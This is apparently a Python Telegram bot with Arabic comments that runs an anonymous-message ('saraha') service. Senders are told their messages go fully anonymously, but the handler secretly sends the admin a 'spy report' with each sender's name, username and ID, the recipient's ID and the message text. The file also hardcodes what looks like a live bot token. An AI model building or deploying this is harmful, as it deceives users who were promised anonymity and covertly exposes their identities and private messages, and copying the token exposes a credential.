
import telebot
from telebot import types
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# 1. التوكن الجديد واليوزر الخاصين ببوتك
BOT_TOKEN = "8682801321:AAH6D6o_A6-4JLhbLP5aNCOWoa4Afo0gv7k"
BOT_USERNAME = "Sarrh1bot"

# 2. الـ ID الخاص بكِ (الآدمين والمشرف العام على كل البوت 👑)
ADMIN_ID = 8820368378  

bot = telebot.TeleBot(BOT_TOKEN)

# قاعدة بيانات مؤقتة في الذاكرة لتخزين الحظر والرسائل والحالات لكل الناس
users_db = {}      
messages_db = {}   
user_states = {}   # لتخزين الشخص اللي بنرسل له {sender_id: target_id}
global_blocked_users = set()  # قائمة الحظر الشامل التفاعلية الخاصة بكِ
msg_counter = 0

# ----------------- خدعة فتح الـ Port للاستضافة -----------------
class DummyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Bot is running perfectly with Master Admin mode!")

def run_dummy_server():
    import os
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), DummyServer)
    print(f"🌍 تم تشغيل سيرفر وهمي على المنفذ: {port}")
    server.serve_forever()
# -----------------------------------------------------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    text_args = message.text.split()
    
    # إلغاء حالة الإرسال السابقة لو حب يرجع للرئيسية
    if user_id in user_states:
        del user_states[user_id]
    
    if user_id not in users_db:
        users_db[user_id] = {"blocked_users": set()}
        
    # إذا دخل المستخدم عن طريق رابط حساب شخص آخر
    if len(text_args) > 1 and text_args[1].isdigit():
        target_id = int(text_args[1])
        
        if target_id == user_id:
            bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة صراحة لنفسك!")
            return
            
        user_states[user_id] = target_id
        bot.send_message(user_id, "✍️ أرسل رسالتك الآن، ويمكنك إرسال رسائل أخرى متتالية مباشرة دون الحاجة للرابط مجدداً:")
        return

    # إذا فتح البوت عادي، يعطيه رابطه الخاص فيه عشان ينشره
    share_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
    welcome_text = (
        "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
        f"🔗 الرابط الخاص بك لاستقبال الرسائل هو:\n`{share_link}`\n\n"
        "انشره in حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
    )
    # ميزة إضافية لكِ إذا فتحتِ البوت تشوفي لوحة ترحيب خاصة
    if user_id == ADMIN_ID:
        welcome_text = "👑 أهلاً بكِ يا مديرة البوت العام! وضع التجسس والإشراف العالمي مُفعّل حالياً.\n\n" + welcome_text

    bot.send_message(user_id, welcome_text, parse_mode="Markdown")

# معالج توجيه الرسائل الذكي والمكشوف لكِ أنتِ فقط
@bot.message_handler(func=lambda message: message.from_user.id in user_states)
def handle_anonymous_routing(message):
    global msg_counter
    sender_id = message.from_user.id
    target_id = user_states[sender_id] # الشخص صاحب الرابط الأصلي

    # التحقق من الحظر الشامل أو الخاص
    if sender_id in global_blocked_users or (target_id in users_db and sender_id in users_db[target_id]["blocked_users"]):
        bot.send_message(sender_id, "❌ عذراً، لا يمكنك إرسال رسالة لهذا المستخدم.")
        if sender_id in user_states:
            del user_states[sender_id]
        return

    if message.content_type != 'text':
        bot.send_message(sender_id, "⚠️ البوت يدعم الرسائل النصية فقط حالياً.")
        return

    msg_counter += 1
    messages_db[msg_counter] = sender_id

    # معلومات المُرسِل التفصيلية والسرية
    first_name = message.from_user.first_name
    username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
    
    # 📝 1. الرسالة التي ستصل لصاحب الرابط الأصلي (بدون أي معلومات عن المرسل!)
    clean_msg_for_owner = (
        f"📩 **وصلتك رسالة صراحة جديدة!**\n\n"
        f"💬 **الرسالة:** {message.text}\n\n"
        f"⏳ _تم إرسالها بهوية مجهولة تماماً._"
    )

    # 🕵️‍♀️ 2. التقرير السري والحصري الذي سيطير لكِ أنتِ فقط على حسابك!
    spy_report_for_admin = (
        f"👁‍🗨 **[تقرير إشرافي] رسالة صراحة متداولة في البوت!**\n\n"
        f"👤 **المُرسِل:** {first_name} ({username}) [ID: `{sender_id}`]\n"
        f"🎯 **المُستقبِل (صاحب الرابط):** [ID: `{target_id}`]\n\n"
        f"💬 **نص الرسالة المنقولة:** {message.text}"
    )

    # إنشاء زر الحظر التفاعلي لكِ أنتِ كمديرة لو حابة تحظري المرسل من البوت كامل
    markup = types.InlineKeyboardMarkup()
    if sender_id in global_blocked_users:
        block_button = types.InlineKeyboardButton(text="🟢 إلغاء الحظر عن المستخدم", callback_data=f"masterblock_{msg_counter}")
    else:
        block_button = types.InlineKeyboardButton(text="🚫 حظر هذا المستخدم من البوت", callback_data=f"masterblock_{msg_counter}")
    markup.add(block_button)

    try:
        # إرسال الرسالة لصاحب الرابط (نظيفة وبدون بيانات)
        bot.send_message(chat_id=target_id, text=clean_msg_for_owner, parse_mode="Markdown")
        
        # إرسال التقرير السري لكِ أنتِ فوراً وبشكل مخفي عن الجميع
        if target_id != ADMIN_ID: # إذا ما كانت الرسالة موجهة إلك أصلاً، ارسلي نسخة تقرير
            bot.send_message(chat_id=ADMIN_ID, text=spy_report_for_admin, reply_markup=markup, parse_mode="Markdown")
        
        # طمأنة المرسِل في شاته وإبقاء الجلسة مفتوحة للإرسال المتتالي
        bot.send_message(chat_id=sender_id, text="✅ تم إرسال رسالتك بنجاح وبسرية تامة! (يمكنك إرسال رسالة أخرى مباشرة)")
    except Exception as e:
        bot.send_message(chat_id=sender_id, text="❌ فشل إرسال الرسالة.")
        if sender_id in user_states:
            del user_states[sender_id]
    
    # تم إزالة سطر del user_states لضمان استمرار خاصية الإرسال المتتالي ورا بعض بدون تكرار دخول الرابط!

# زر الحظر التفاعلي الخاص بكِ أنتِ فقط لإلغاء وتفعيل الحظر بضغطة زر
@bot.callback_query_handler(func=lambda call: call.data.startswith('masterblock_'))
def handle_master_block(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ أنتِ لستِ مديرة النظام!")
        return

    msg_id = int(call.data.split('_')[1])
    sender_id = messages_db.get(msg_id)
    
    if not sender_id:
        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية البيانات.")
        return

    markup = types.InlineKeyboardMarkup()
    
    # إذا كان محظوراً -> قومي بإلغاء حظره شامل
    if sender_id in global_blocked_users:
        global_blocked_users.remove(sender_id)
        btn = types.InlineKeyboardButton(text="🚫 حظر هذا المستخدم من البوت", callback_data=f"masterblock_{msg_id}")
        markup.add(btn)
        
        # تنظيف النص من جملة الحظر عند الإلغاء
        clean_text = call.message.text.split("\n\n🛑")[0]
        bot.edit_message_text(chat_id=ADMIN_ID, message_id=call.message.message_id, text=clean_text, reply_markup=markup, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "🟢 تم إلغاء الحظر بنجاح!")
        
    # إذا لم يكن محظوراً -> احظريه شاملاً من البوت
    else:
        global_blocked_users.add(sender_id)
        btn = types.InlineKeyboardButton(text="🟢 إلغاء الحظر عن المستخدم", callback_data=f"masterblock_{msg_id}")
        markup.add(btn)
        
        bot.edit_message_text(
            chat_id=ADMIN_ID, 
            message_id=call.message.message_id, 
            text=f"{call.message.text}\n\n🛑 [تم الحظر الشامل بنجاح]", 
            reply_markup=markup,
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id, "🚫 تم حظر المستخدم من البوت!")

if __name__ == "__main__":
    print("🧹 تنظيف الجلسات السابقة...")
    try:
        bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
        
    threading.Thread(target=run_dummy_server, daemon=True).start()
    print("🕵️‍♀️ البوت يعمل الآن بكافة ميزاتك الأصلية مع زر الحظر التفاعلي...")
    bot.infinity_polling()
